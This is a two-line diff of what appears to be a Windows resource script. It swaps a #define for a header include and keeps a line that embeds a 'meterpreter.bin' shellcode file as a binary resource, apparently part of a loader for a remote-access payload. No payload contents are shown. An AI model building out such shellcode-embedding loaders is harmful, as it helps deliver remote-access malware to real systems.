@@ -1,2 +1,2 @@
-#define SHELLCODE 101
+#include "resource.hpp"
 SHELLCODE BINARY "meterpreter.bin"
